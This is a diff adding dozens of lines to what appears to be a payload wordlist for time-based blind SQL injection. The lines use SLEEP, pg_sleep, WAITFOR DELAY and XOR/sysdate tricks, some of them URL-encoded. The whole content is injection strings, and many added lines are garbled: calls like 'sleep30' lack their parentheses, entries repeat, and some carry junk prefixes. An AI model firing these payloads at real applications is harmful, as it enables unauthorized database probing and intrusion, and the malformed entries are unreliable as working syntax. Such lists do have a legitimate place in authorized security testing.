@@ -74,3 +74,47 @@ ORDER BY SLEEP(30)#
 (SELECT * FROM (SELECT(SLEEP(30)))ecMj)--
 + SLEEP(30) + '
 SLEEP(30)/*' or SLEEP(30) or '" or SLEEP(30) or "*/
+(SELECT+SLEEP30)
+(SELECT+pg_sleep30)
+(WAITFOR+DELAY+'0:0:30')--
+(select*from(select(sleep30))a)
+al'+(select*from(select(sleep30))a)+'
+0'XOR(if(now()=sysdate(),sleep30,0))XOR'Z/
+0'XOR(if(now()=sysdate(),sleep30,0))XOR'Z
+';%20waitfor%20delay%20'0:0:30'%20--%20
+`';%20waitfor%20delay%20'0:0:30'%20--%20`
+';%20waitfor%20delay%20'0:0:30'%20--%20
+1%27/**/%256fR/**/50%2521%253D22%253B%2523 
+0\"XOR(if(now()=sysdate(),sleep30,0))XOR\"Z
+';SELECT PG_SLEEP30--
+0"XOR(if(now()=sysdate()%2Csleep30%2C0))XOR"Z
+'+(select*from(select(sleep30))a)+
+'XOR(if(now()=sysdate(),sleep30,0))XOR’Z
+0'XOR(if(now()=sysdate(),sleep30,0)) XOR'Z
+(select(0)from(select(sleep30))v)/*'+
+(select(0)from(select(sleep30))v)+'"+
+(select(0)from(select(sleep30))v)+"*/
+' AND (SELECT 8871 FROM (SELECT(SLEEP30))uZxz)--
+' AND (SELECT 8871 FROM (SELECT(SLEEP30))uZxz)
+XOR(if(now()=sysdate(),sleep30,0))XOR
+0'XOR(if(now()=sysdate(),sleep30,0))XOR'Z
+0'XOR(if(now()=sysdate(),sleep30,0))XOR'Z
+'XOR(sleep30)OR'
+'XOR(if(now()=sysdate()%2Csleep30%2C0))XOR'Z
+0'XOR(if(now()=sysdate()%2Csleep30%2C0))XOR'Z
+0'XOR(if(now()=sysdate(),sleep30,0))XOR'Z
+0'XOR(if(now()=sysdate(),sleep30,0))XOR
+0'XOR(if(now()=sysdate(),sleep30,0))XOR'
+0'XOR(if(now()=sysdate(),sleep(5*6),0))XOR'Z
+'+(select*from(select(sleep30))a)+'
+1%27/**/%256fR/**/50%2521%253D22%253B%2523
+"0\"XOR(if(now()=sysdate(),sleep30,0))XOR\"Z"
+rrr';SELECT PG_SLEEP30--
+' AND (SELECT 8871 FROM (SELECT(SLEEP30))uZxz)
+orwa' AND (SELECT 6377 FROM (SELECT(SLEEP30))hLTl)--
+`';%20waitfor%20delay%20'0:0:30'%20--%20`
+0'XOR(if(now()=sysdate(),sleep30,0))XOR'Z
+'XOR(sleep30)OR'
+'XOR(if(now()=sysdate()%2Csleep30%2C0))XOR'Z
+(select*from(select(sleep30))a)
+1'%20OR%205*6*1=30%20AND%20000971=000971%20--%20"
